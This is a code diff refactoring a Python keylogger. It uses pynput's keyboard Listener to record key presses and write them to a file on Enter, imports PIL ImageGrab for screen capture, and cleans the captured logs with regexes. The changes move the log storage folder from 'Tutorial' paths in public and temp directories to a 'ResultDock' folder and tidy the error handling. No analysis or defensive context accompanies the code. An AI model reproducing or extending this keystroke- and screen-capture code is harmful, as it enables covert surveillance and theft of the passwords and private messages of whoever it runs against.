@@ -1,7 +1,7 @@
 # Import built-in modules #
-import logging
 import pathlib
 import re
+import sys
 import time
 import os
 from multiprocessing import Process
@@ -9,6 +9,7 @@ from multiprocessing import Process
 # Import third-party modules #
 from PIL import ImageGrab
 from pynput.keyboard import Key, Listener
+
 
 '''
 ################
@@ -45,7 +46,7 @@ def OnPress(key):
     # If the enter key was pressed #
     if key == Key.enter:
         # Write the sentence logged in keys capture list to file #
-        key_file.write(str(keys) + '\n\n')
+        key_file.write(f'{str(keys)}\n\n')
         del keys[:]
     # If the escape key was pressed #
     elif key == Key.esc:
@@ -111,10 +112,10 @@ def RegexFormatting(path):
                             )
                             ((?:_l|_r|_up|_down
                             )?)
-                            :.<[0-9]+>>''', re.X)
+                            :.<\d+>>''', re.X)
 
     regex3 = re.compile(r'[^\S\r\n]')
-    regex4 = re.compile(r'.<Key\.backspace:<8>>')
+    regex4 = re.compile(r'.<Key\.backspace:<\d+>>')
     regex5 = re.compile(r'<Key\.space:>')
 
     # Open un-formatted file #
@@ -168,24 +169,31 @@ def main():
 
 
 if __name__ == '__main__':
-    # List to temporarily store captured keys #
+    # List for recording key presses #
     keys = []
+    # Get the current working directory #
+    cwd = os.getcwd()
 
     # If OS is Windows #
     if os.name == 'nt':
-        # Create storage directory #
-        pathlib.Path('C:/Users/Public/Tutorial').mkdir(parents=True, exist_ok=True)
-        file_path = 'C:\\Users\\Public\\Tutorial\\'
+        file_path = f'{cwd}\\ResultDock\\'
     # Linux #
     else:
-        # Create storage directory #
-        pathlib.Path('/tmp/Tutorial').mkdir(parents=True, exist_ok=True)
-        file_path = '\\tmp\\Tutorial\\'
+        file_path = f'{cwd}/ResultDock/'
+
+    # Create storage directory #
+    pathlib.Path(file_path).mkdir(parents=True, exist_ok=True)
 
     try:
         main()
 
+    # If Ctrl + c is detected #
     except KeyboardInterrupt:
         print('* Ctrl-C detected ... exiting program *')
+
+    # If unknown exception occurs #
     except Exception as ex:
-        logging.exception('* Error Occurred: {} *'.format(ex))
+        print(f'\n* Unknown exception occurred: {ex} *', file=sys.stderr)
+        sys.exit(1)
+
+    sys.exit(0)
